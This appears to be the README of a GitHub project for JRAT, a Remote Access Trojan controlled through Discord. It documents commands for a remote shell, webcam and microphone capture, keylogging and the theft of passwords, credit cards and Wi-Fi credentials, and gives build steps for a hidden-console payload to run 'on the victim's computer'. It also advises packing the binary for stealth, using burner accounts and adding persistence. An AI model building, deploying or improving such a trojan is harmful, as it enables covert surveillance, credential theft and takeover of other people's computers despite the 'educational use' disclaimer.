<p align="center">
  <img src="assets/bannertransparent2.png">
</p>

JRAT is a stealthy, versatile, and modular Remote Access Trojan (RAT) that uses Discord as its Command and Control (C2) infrastructure. Built for educational purposes and red team operations, JRAT eliminates the need for a dedicated server by leveraging Discord as a secure "man-in-the-middle" (MITM) channel.

It supports encrypted command transmission, data exfiltration, remote shell access, surveillance, and system manipulation — all controlled through a private Discord server.


## PLEASE NOTE

> ⚠️ **This software is intended for educational and authorized red-team use only. Do not deploy this tool on systems you do not own or have explicit permission to test.**

> ⚠️ **This project was published nearly a year after its initial development. Some features or commands may be outdated or unstable. Expect occasional bugs or compatibility issues, especially on newer systems. Use with caution and test thoroughly before deployment.**


## Commands

JRAT uses Discord commands to manage infected clients remotely. Here's the full list of available commands and their usage:

<details>
<summary><strong>📘 Click to expand full command list</strong></summary>

`*` - Argument can include spaces

`?` - Optional argument

---

### 🤖 General

| Command | Description |
|--------|-------------|
| `?help <command?>` | Shows help info or a specific command's description |
| `?active` | Lists all active infected clients |
| `?version <user>` | Gets RAT version date|

---

### 💻 System Control

| Command | Description |
|--------|-------------|
| `?shell <user> <command*>` | Runs terminal commands remotely |
| `?restart <user>` | Restarts the victim’s PC |
| `?shutdown <user>` | Shuts down the victim’s PC |
| `?bluescreen <user>` | Triggers a BSOD|
| `?isadmin <user>` | Checks for admin privileges |
| `?restart_rat <user>` | Restarts the RAT instance |
| `?selfdestruct <user>` | Deletes the RAT permanently |

---

### 🖼️ Surveillance

| Command | Description |
|--------|-------------|
| `?ss <user>` | Takes a full-screen screenshot |
| `?webcam <user> <index>` | Captures webcam snapshot |
| `?record_screen <user>` | Records 15s screen video |
| `?record_mic <user>` | Records 15s microphone audio 🎤 |
| `?record_sys_audio <user>` | Records 15s desktop audio 🔊 |

---

### 🔒 Info Stealers

| Command | Description |
|--------|-------------|
| `?getcc <user>` | Dumps saved credit cards (may be outdated) |
| `?getpass <user>` | Steals saved passwords |
| `?getwifipass <user>` | Dumps saved Wi-Fi creds |
| `?getclipboard <user>` | Reads clipboard content |
| `?getkeylogs <user>` | Fetches keylogs |
| `?geolocate <user>` | Estimates geolocation via IP |
| `?idletime <user>` | Gets idle time since last activity |

---

### 🧠 System Recon

| Command | Description |
|--------|-------------|
| `?getspecs <user>` | Basic hardware + system specs |
| `?getspecs_raw <user>` | Full raw system dump |
| `?proclist <user>` | Lists running processes |
| `?killproc <user> <proc>` | Force-kills a process |
| `?es_custom <user> <es_query*>` | Runs `Everything.exe` search remotely |
| `?tree <user> <path>` | Displays folder structure |

---

### 🪟 Interaction & Control

| Command | Description |
|--------|-------------|
| `?blockinput <user> <all/keyboard/mouse>` | Disables user input |
| `?unblockinput <user> <all/keyboard/mouse>` | Re-enables input |
| `?blockedinput <user>` | Shows blocked input status |

---

### 📂 File Ops

| Command | Description |
|--------|-------------|
| `?getfile <user> <path>` | Fetches file (ZIP format) |
| `?litterbox <user> <path>` | Downloads up to 1GB file |
| `?upload <user> <path>` | Uploads file via Discord attachment |
| `?downloadurl <user> <url> <path>` | Downloads file from URL |
| `?update_rat <user> <url>` | Replaces the current RAT with updated one |

---

</details>

### Requirements

- Python 3.9+
- pip
- A Discord bot token (all permissions recommended)
- A private Discord server (for C2 communication)

---

### Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/NullPwntr/JRAT.git
   cd JRAT
   ```

2. **Install the dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Configure your bot token:**
   - Open the `JRAT.py` file with an IDE
   - Edit the variables found in the first lines within the code with your Discord bot token & The admin name (Your pc's name) 
   - Set your channel ID for Activity Logging (commands can be used in any channel)

4. **Build the client payload:**
   - Compile it with `pyinstaller` or `nuitka` with cmd:
     ```bash
     pyinstaller --onefile --noconsole -i "NONE" --add-binary="es.exe;." .\JRAT.py
     ```
     or just run the `installer_cmd.bat` file
   - If you wish to add an icon to the executable then replace the `"NONE"` with `"PATH_TO_DESIRED_ICON"` in the cmd or the installer file

5. **Run the executable on the victim's computer. found in:**
   ```
   JRAT/dist/JRAT.exe | JRAT/dist/matador.exe
   ``` 
   NOTE: The project is called JRAT, but the executable is `matador.exe` (can be renamed) + If you want to use the ?update_rat command you must keep the exe name `matador.exe` (will be fixed later)


---

### Installation Complete

JRAT will now listen for commands through your specified Discord server and act as a control interface for all connected clients. Commands can be issued directly through Discord messages using `?command` syntax.

---

### RECOMMENDED

- Use a burner Discord account and private server for OPSEC.
- For stealth, obfuscate the client binary and pack it with tools like `UPX` or `Nuitka`.
- Add persistence and encryption modules as needed — JRAT is modular by design.

## Room for Improvement

JRAT was developed as a proof-of-concept and published long after its initial creation. While it covers a wide range of functionality, there is still significant room for improvement in both design and stability.

Some areas that could use attention:
- Code refactoring and modularization
- Cross-platform support (Linux/macOS)
- Better error handling and command validation
- Real-time feedback or logs through Discord
- Improved persistence and stealth features
- UI for easier payload generation and control

Contributions, forks, and pull requests are welcome.. just keep it ethical 👀.

This project is meant to spark learning, exploration, and red team experimentation, not to be a polished, plug-and-play product. Expect bugs, weird behavior, and plenty of areas to rebuild or improve.

Thanks for reading.

---